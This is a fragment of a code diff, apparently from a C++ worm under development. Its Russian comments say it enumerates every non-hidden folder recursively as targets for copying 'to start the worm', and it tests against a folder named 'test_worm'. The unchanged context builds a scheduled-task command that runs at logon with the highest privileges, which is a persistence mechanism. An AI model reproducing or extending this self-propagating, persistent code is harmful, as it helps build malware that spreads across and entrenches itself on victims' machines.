@@ -69,7 +69,7 @@ public:
 
 
 
-	void search_list_dir(const wstring& path_to_dir) { // рекурсивный поиск всех папок по адрессу и внутри
+	void search_list_dir(const wstring& path_to_dir, vector<wstring> &list_dir_tmp) { // рекурсивный поиск всех папок по адрессу и внутри и копирование в выбранный вектор
 		error_code ec;
 
 		fs::directory_iterator it(path_to_dir, ec);
@@ -81,19 +81,20 @@ public:
 		for (const auto& entry : it) {
 			if (entry.is_directory(ec) && !ec && !is_hidden(entry.path())) {
 				std::wstring dir_path = entry.path().wstring();
-				list_dir.push_back(dir_path);
-				search_list_dir(dir_path);  // рекурсия
+				list_dir_tmp.push_back(dir_path);
+				search_list_dir(dir_path, list_dir_tmp);  // рекурсия
 			}
 		}
 
-		list_dir.push_back(path_to_dir);
+		
 	}
 
 
-	void search_list_dir() { // это нам возможно уже не нужно
+	void search_list_dir() { // для старта червя
 		list_dir.clear();
-		search_list_dir(path_to_start);
-		//search_list_dir(L"E:\\test_worm");//search_list_dir(path_to_start);//search_list_dir("F:\Anki\ChatExport_2025-04-07\video_files");
+		//search_list_dir(path_to_start, list_dir);
+		search_list_dir(L"E:\\test_worm", list_dir);//search_list_dir(path_to_start);//search_list_dir("F:\Anki\ChatExport_2025-04-07\video_files");
+		list_dir.push_back(path_to_start);
 	}
 
 	void print_list_dir() { // вывод всех найденных папок, в которых будет копирование
@@ -213,6 +214,7 @@ public:
 			L"/sc ONLOGON /RL HIGHEST /F /RU \"" + get_username() + L"\"";
 		_wsystem(cmd.c_str());
 	}
+
 
 	
 };
